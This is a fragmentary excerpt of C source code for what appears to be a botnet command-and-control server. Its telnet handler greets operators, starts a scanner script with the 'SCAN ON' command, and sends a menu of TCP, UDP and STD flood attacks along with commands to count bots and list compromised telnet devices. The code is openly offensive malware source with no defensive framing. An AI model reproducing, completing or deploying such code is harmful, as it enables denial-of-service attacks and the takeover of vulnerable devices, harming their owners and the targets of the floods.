...
void *telnetWorker(void *sock)
{
		...
		sprintf(line1, "      \x1b[0;31mWelcome Nova Sex        \r\n");
		sprintf(line2, "      \x1b[0;31mHELP for Commands        \r\n");
		
        if(send(thefd, "\x1b[0;36m****************************************\r\n", 51, MSG_NOSIGNAL) == -1) goto end;
		...
		if(strstr(buf, "SCAN ON")) {
	        system("python d.py 500 B 119.93 3");
		continue;
		}
		...
		if(strstr(buf, "HELP")) 
	    {  
		  sprintf(botnet, "\x1b[0;36mAttack Methods---------------------------------------\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36m!* TCP [IP] [PORT] [TIME] 32 all 0 1 -TCP FLOOD\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36m!* UDP [IP] [PORT] [TIME] 32 0 1 -UDP FLOOD\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36m!* STD [IP] [PORT] [TIME] -STD FLOOD\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36mExtra Commands---------------------------------------\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36m!* KILLATTK -KILLS ALL ATTACKS\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;36mSCAN ON -TURNS THE SCANNER ON\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		   sprintf(botnet, "\x1b[0;36mBOTS -SHOW REAL BOT COUNT\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		   sprintf(botnet, "\x1b[0;36mSTATUS -SHOWS THE TELNET DEVICES\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
